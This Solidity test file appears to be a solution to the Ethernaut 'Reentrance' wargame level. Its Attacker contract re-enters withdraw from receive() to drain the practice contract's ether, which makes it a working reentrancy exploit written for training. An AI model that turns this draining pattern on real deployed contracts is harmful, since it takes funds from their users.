pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Reentrance/ReentranceFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";
import {DSTest} from "../../lib/ds-test/src/test.sol";

contract Attacker {
    Reentrance target;

    constructor(Reentrance _target) {
        target = _target;
    }

    function withdraw(uint256 _amount) external {
        target.withdraw(_amount);
    }

    receive() external payable {
        uint256 rest = address(target).balance;
        if (rest == 0) {
            return;
        }
        target.withdraw(0.1 ether);
        // withdraw amount should be <= the original amount.
        // Otherwise, this cannot pass the guard `if(balances[msg.sender] >= _amount)`.
    }
}

contract ReentranceTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testReentranceHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        ReentranceFactory reentranceFactory = new ReentranceFactory();
        ethernaut.registerLevel(reentranceFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{ value: 1 ether }(reentranceFactory);
        Reentrance ethernautReentrance = Reentrance(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        Attacker attacker = new Attacker(ethernautReentrance);
        ethernautReentrance.donate { value: 0.1 ether }(address(attacker));
        // emit log_named_uint("balance before", address(ethernautReentrance).balance);
        attacker.withdraw(0.1 ether);
        // emit log_named_uint("balance after", address(ethernautReentrance).balance);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
